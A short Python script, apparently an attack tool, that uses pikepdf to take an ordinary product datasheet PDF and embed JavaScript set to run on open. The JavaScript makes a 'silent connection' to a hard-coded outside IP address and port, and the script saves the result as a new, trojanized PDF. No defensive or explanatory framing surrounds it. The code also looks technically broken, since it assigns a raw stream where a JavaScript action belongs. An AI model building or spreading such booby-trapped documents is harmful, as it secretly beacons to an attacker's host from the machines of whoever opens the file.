import pikepdf
from pikepdf import Pdf

# Open an existing PDF
pdf = Pdf.open("11391xxx_DALI_PushDim-B.pdf")

# JavaScript code to create a silent connection to the remote site
js = """
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://5.181.20.128:8443', true);
xhr.send(null);
"""

# Convert the JavaScript string to bytes
js_bytes = js.encode('utf-8')

# Add the JavaScript action to the PDF
pdf.Root.Names = pdf.make_stream(js_bytes)
pdf.Root.OpenAction = pdf.Root.Names

# Save the modified PDF
pdf.save("Remote_connection_added.pdf")

print("Silent connection JavaScript added to PDF successfully.")
